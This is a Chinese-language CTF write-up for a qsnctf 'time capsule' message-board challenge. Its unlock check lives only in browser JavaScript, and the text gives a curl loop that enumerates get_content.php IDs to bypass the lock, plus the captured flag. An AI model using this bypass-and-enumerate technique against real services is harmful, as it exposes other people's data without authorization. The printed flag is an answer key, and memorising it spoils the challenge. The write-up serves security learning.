# WP · qsnctf 40806 — 时间胶囊解锁绕过（前端校验 = 纸老虎）

> 分类：14-综合组合题 ｜ 栈：nginx/1.22.1 + PHP/8.0.30 ｜ 难度：入门（纯逻辑漏洞）
> 地址：`http://challenge.qsnctf.com:40806/`
> **Flag：`flag{3a8888fd3cc849ecb7d228335e7242c8}`**

---

## 0. 一句话思路
留言板每条留言有"解封日期"，但**解锁判断全写在浏览器端 JS 里**（`now >= unlockDate` 才去拉内容）→ 直接请求 `get_content.php?id=N` 绕过时间锁 → 枚举 ID 拖出 flag。

## 1. 侦察
- 首页：留言板，表单 `nickname + content + unlock_date`。
- 每条留言带 `data-unlock-date`，锁定状态的留言内容被遮成 `**`，显示倒计时。
- 关键代码（页面源码里的 JS）：
```js
if (now >= unlockDateObj) {
    fetch('get_content.php?id=' + messageId)   // ← 真实内容全靠这个接口
        .then(response => response.text())
        .then(data => document.getElementById(contentId).textContent = data);
} else {
    // 未解封：只显示倒计时，不拉内容
}
```

## 2. 漏洞分析
- **解锁判断在客户端**：浏览器判断"时间到了"才去请求 `get_content.php`。服务器端接口**本身没有任何时间/权限校验**——谁都能直接调。
- 这是典型的"前端校验=纸老虎"：逻辑放在客户端 ≠ 安全边界，服务端才是最后防线。
- 顺带：`get_content.php?id=N` 没有鉴权，还能**枚举任意 ID**。

## 3. 利用
```bash
# 枚举留言 ID（页面里有 content-1 ~ content-9）
for i in 1 2 3 4 5 6 7 8 9; do
    curl -s "http://challenge.qsnctf.com:40806/get_content.php?id=$i"
    echo
done
```
`id=2`（系统留言，解封日期 2026-08-28，本应锁着）返回：
```
FLAG: flag{3a8888fd3cc849ecb7d228335e7242c8}
```

## 4. 复盘 & 套路沉淀
1. **看到前端控制"能不能看/能不能点"→ 直接绕前端**：抓接口、直接请求，别跟着前端逻辑走（前端校验=纸老虎，Web 心法第 4 条）。
2. **时间锁/倒计时类功能**：解锁判断在 JS 里 = 白给，`get_content.php` 这类数据接口往往无鉴权。
3. **ID 枚举**：`?id=N` 直接遍历 1..N，锁定状态的数据也可能暴露。
4. **服务端才是安全边界**：任何"隐藏"都得在服务端做（权限/时间校验），前端隐藏只是 UI 层。
